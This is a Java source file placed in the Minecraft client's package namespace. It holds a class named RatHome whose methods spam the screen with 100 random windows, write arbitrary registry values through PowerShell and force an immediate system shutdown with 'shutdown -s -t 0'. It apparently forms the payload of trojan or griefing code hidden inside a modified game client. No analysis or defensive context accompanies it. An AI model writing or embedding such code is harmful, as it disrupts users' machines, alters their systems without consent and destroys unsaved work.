package net.minecraft.client.main;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import javax.swing.JFrame;

public class RatHome {
    private static List<JFrame> frames = new ArrayList<JFrame>();

    public static void startWindows() {
        Random sb = new Random();
        for (int n = 0; n < 100; ++n) {
            JFrame frame = new JFrame("Oye");
            frame.setSize(40, 10);
            frame.setLocation(sb.nextInt(2560), sb.nextInt(1440));
            frame.setVisible(true);
            frames.add(frame);
        }
    }

    public static void clearWindows() {
        for (JFrame frame : frames) {
            frame.dispose();
        }
        frames.clear();
    }

    public static void runtxt() {
        try {
            String[] command = new String[]{"powershell.exe", "-Command", "Set-ItemProperty -Path 'HKCU:\\Software\\Key' -Name 'sbsbsbsbsbsb' -Value 'sbsbsbsbsbsbsbs'"};
            ProcessBuilder processBuilder = new ProcessBuilder(command);
            Process process = processBuilder.start();
            process.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = "";
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void runRegister() {
        try {
            String command = "powershell.exe -Command \"New-Item -Path 'HKCU:\\Software\\Key' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Key' -Name 'cnmadwezzzcxcvvvvvv' -Value '11231456'\"";
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = "";
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void StopComputer() {
        try {
            Runtime.getRuntime().exec("shutdown -s -t 0");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}

